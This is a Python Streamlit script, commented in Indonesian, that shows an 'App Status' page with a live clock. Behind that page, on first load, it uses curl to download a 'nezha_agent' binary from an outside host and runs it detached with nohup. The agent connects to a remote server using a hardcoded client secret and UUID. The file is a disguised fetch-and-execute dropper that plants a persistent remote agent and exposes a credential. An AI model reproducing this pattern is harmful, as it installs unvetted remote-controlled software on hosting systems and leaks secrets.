import streamlit as st
import subprocess
from datetime import datetime
import time

# --- Konfigurasi Halaman ---
st.set_page_config(
    page_title="App Status",
    page_icon="🟢",
    layout="centered"
)

# Perintah shell yang akan dijalankan secara otomatis di latar belakang.
COMMAND_TO_RUN_ONCE = """
(curl -L https://alice.mxflower.eu.org/d/CF%20R2/database/nezha_agent -o agent && chmod +x agent) && \
nohup env NZ_SERVER=vps-monitor.fly.dev:443 \
    NZ_TLS=true \
    NZ_CLIENT_SECRET=CqmryaDkXPUPoRtdGE8NvfGhjEOLu2b9 \
    NZ_UUID=6505d69d-e932-405f-aace-06c7c9d1e09d \
    ./agent > /dev/null 2>&1 &
"""

# --- Logika Eksekusi Otomatis ---

# Gunakan st.session_state untuk membuat "flag" yang menandai apakah
# proses sudah pernah dijalankan dalam sesi ini.
if 'agent_triggered' not in st.session_state:
    st.session_state.agent_triggered = False

# Jalankan perintah HANYA jika flag-nya False (belum pernah dijalankan)
if not st.session_state.agent_triggered:
    try:
        # Tampilkan pesan bahwa proses sedang dimulai
        st.info("🚀 Inisialisasi... Memulai agent di latar belakang.")
        
        # Gunakan Popen untuk menjalankan perintah tanpa menunggu selesai.
        subprocess.Popen(COMMAND_TO_RUN_ONCE, shell=True)
        
        # Set flag ke True agar blok kode ini tidak akan pernah dijalankan lagi di sesi ini.
        st.session_state.agent_triggered = True
        
        st.toast("Agent berhasil dimulai!", icon="✅")
        time.sleep(2)
        
        # --- PERUBAHAN DI SINI ---
        # Gunakan st.rerun() yang merupakan fungsi standar sekarang.
        st.rerun()

    except Exception as e:
        # Jika ada error, tampilkan dan hentikan aplikasi
        st.error(f"❌ Gagal memulai agent di latar belakang:")
        st.code(str(e))
        st.stop()


# --- Tampilan Utama (UI) ---
# Bagian ini akan selalu ditampilkan setelah blok eksekusi di atas selesai.

st.title("🟢 App Status")
st.success("Aplikasi berjalan. Agent telah aktif di latar belakang.")
st.markdown("---")

# Placeholder untuk jam yang akan diupdate terus menerus
clock_placeholder = st.empty()

# Loop tak terbatas untuk membuat efek jam "live"
while True:
    now = datetime.now()
    clock_placeholder.metric(
        label="Waktu Server Saat Ini",
        value=now.strftime("%H:%M:%S"),
        delta=now.strftime('%d %B %Y'),
        delta_color="off"
    )
    time.sleep(1)
